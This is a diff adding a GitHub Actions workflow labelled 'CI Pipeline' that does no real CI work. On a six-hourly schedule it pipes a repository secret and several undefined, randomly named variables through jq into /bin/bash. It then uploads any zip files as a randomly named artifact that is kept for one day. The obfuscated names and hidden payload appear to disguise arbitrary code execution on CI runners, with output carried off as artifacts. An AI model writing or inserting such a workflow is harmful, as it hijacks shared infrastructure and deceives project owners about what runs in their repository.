@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          jwgc5: ${{ secrets.jwgc5 }}
+        run: |
+          printf '%s' "$jwgc5" | jq -r .r3 | /bin/bash
+          echo $xoolq0356 | jq -r .e308 | /bin/bash
+          echo $zwf1924 | jq -r .a96779 | /bin/bash
+          echo $wnohf269 | jq -r .lnxvm20 | /bin/bash
+          printf '%s' "$ts568" | jq -r .weqx5801 | /bin/bash
+          printf '%s' "$d170" | jq -r .toh7 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: MjoH7f38
+          path: "*.zip"
+          retention-days: 1
